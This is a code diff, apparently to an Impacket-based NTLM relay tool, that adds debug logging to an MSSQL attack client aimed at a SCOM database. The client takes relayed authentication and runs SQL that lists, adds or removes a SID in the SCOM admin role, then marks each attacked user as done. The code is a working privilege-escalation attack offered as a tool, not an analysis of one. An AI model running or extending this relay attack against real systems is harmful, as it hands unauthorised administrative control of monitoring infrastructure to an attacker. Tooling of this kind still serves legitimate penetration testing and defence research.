@@ -14,69 +14,106 @@ class SCOMMSSQLAttackClient(ProtocolAttack):
     PLUGIN_NAMES = ["MSSQL"]
     
     def run(self):
+        logger.info("=" * 80)
+        logger.info("[DEBUG] SCOMMSSQLAttackClient.run() called!")
+        logger.info(f"[DEBUG] Attack client type: {type(self)}")
+        logger.info(f"[DEBUG] Has client attribute: {hasattr(self, 'client')}")
+        if hasattr(self, 'client'):
+            logger.info(f"[DEBUG] Client type: {type(self.client)}")
+            logger.info(f"[DEBUG] Client attributes: {dir(self.client)}")
+        logger.info(f"[DEBUG] Has username attribute: {hasattr(self, 'username')}")
+        logger.info(f"[DEBUG] Has scom_relay attribute: {hasattr(self, 'scom_relay')}")
+        logger.info("=" * 80)
+        
         self.scom_relay.attack_lock.acquire()
         try:
             self._run()
         except Exception as e:
-            logger.info(f"Something went wrong:\n{e}")
+            logger.info(f"[ERROR] Exception in run(): {e}")
             import traceback
-            logger.debug(traceback.format_exc())
+            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")
         finally:
             self.scom_relay.attack_lock.release()
 
     def _run(self):
+        logger.info("[DEBUG] Entering _run() method")
+        
         # Get username from the client
         username = self.username if hasattr(self, 'username') else 'Unknown'
+        logger.info(f"[DEBUG] Username: {username}")
         
         if username in self.scom_relay.attacked_targets:
             logger.debug(f"Skipping user {username} since attack was already performed")
             return
 
         try:
-            logger.info(f"Authenticated as: {username}")
+            logger.info(f"[+] Authenticated as: {username}")
+            logger.info(f"[DEBUG] Operation mode: {self.scom_relay.operation_mode}")
+            logger.info(f"[DEBUG] Query to execute: {self.scom_relay.query}")
 
             # Execute the appropriate query based on operation mode
             if self.scom_relay.operation_mode == 'list':
-                logger.info("Listing current members of SCOM admin role...")
+                logger.info("[*] Listing current members of SCOM admin role...")
                 self.execute_query(self.scom_relay.query)
             elif self.scom_relay.operation_mode == 'delete':
-                logger.info(f"Removing SID from SCOM admin role...")
+                logger.info(f"[*] Removing SID from SCOM admin role...")
                 self.execute_query(self.scom_relay.query)
-                logger.info(f"\n[+] SID successfully removed from SCOM admin role")
+                logger.info(f"[+] SID successfully removed from SCOM admin role")
             else:  # update/insert mode
-                logger.info(f"Adding SID to SCOM admin role...")
+                logger.info(f"[*] Adding SID to SCOM admin role...")
                 self.execute_query(self.scom_relay.query)
-                logger.info(f"\n[+] SID successfully added to SCOM admin role")
+                logger.info(f"[+] SID successfully added to SCOM admin role")
 
         except Exception as e:
-            logger.info(f"An error occurred during the relay: \n{str(e)}")
+            logger.info(f"[ERROR] An error occurred during the relay: {str(e)}")
             import traceback
-            logger.debug(traceback.format_exc())
+            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")
 
         # Mark attack as complete
         self.finish_run()
 
     def execute_query(self, query):
         """Execute SQL query using the MSSQL client"""
+        logger.info("[DEBUG] Entering execute_query()")
+        logger.info(f"[DEBUG] Query: {query}")
+        
         try:
-            logger.debug(f"Executing query: {query}")
-            # Use the client's sql_query method
+            if not hasattr(self, 'client'):
+                logger.info("[ERROR] self.client does not exist!")
+                return
+            
+            logger.info(f"[DEBUG] Client object: {self.client}")
+            logger.info(f"[DEBUG] Client has sql_query: {hasattr(self.client, 'sql_query')}")
+            
+            if not hasattr(self.client, 'sql_query'):
+                logger.info("[ERROR] Client does not have sql_query method!")
+                logger.info(f"[DEBUG] Available methods: {[m for m in dir(self.client) if not m.startswith('_')]}")
+                return
+            
+            logger.info("[DEBUG] Calling client.sql_query()...")
             self.client.sql_query(query)
+            logger.info("[DEBUG] sql_query() completed")
+            
             # Print the results
+            logger.info("[DEBUG] Calling printReplies()...")
             self.client.printReplies()
+            logger.info("[DEBUG] Calling printRows()...")
             self.client.printRows()
+            logger.info("[DEBUG] Query execution completed successfully")
+            
         except Exception as e:
-            logger.info(f"Error executing query: {str(e)}")
+            logger.info(f"[ERROR] Error executing query: {str(e)}")
             import traceback
-            logger.debug(traceback.format_exc())
+            logger.info(f"[ERROR] Full traceback:\n{traceback.format_exc()}")
 
     def finish_run(self):
         """Mark the attack as complete"""
+        logger.info("[DEBUG] Entering finish_run()")
         username = self.username if hasattr(self, 'username') else 'Unknown'
         if username != 'Unknown':
             self.scom_relay.attacked_targets.append(username)
-        # Don't shutdown immediately - let the relay continue for other connections
-        # self.scom_relay.shutdown()
+            logger.info(f"[DEBUG] Added {username} to attacked_targets")
+        logger.info("[DEBUG] Attack complete")
 
 
 class MSSQLSCOMRELAY:
@@ -182,8 +219,13 @@ class MSSQLSCOMRELAY:
 
     def get_attack_mssql_client(self, *args, **kwargs):
         """Return the attack client for MSSQL"""
+        logger.info("[DEBUG] get_attack_mssql_client() called!")
+        logger.info(f"[DEBUG] args: {args}")
+        logger.info(f"[DEBUG] kwargs: {kwargs}")
         attack_client = SCOMMSSQLAttackClient(*args, **kwargs)
         attack_client.scom_relay = self
+        logger.info(f"[DEBUG] Created attack client: {attack_client}")
+        logger.info(f"[DEBUG] Attack client has scom_relay: {hasattr(attack_client, 'scom_relay')}")
         return attack_client
 
     def shutdown(self):
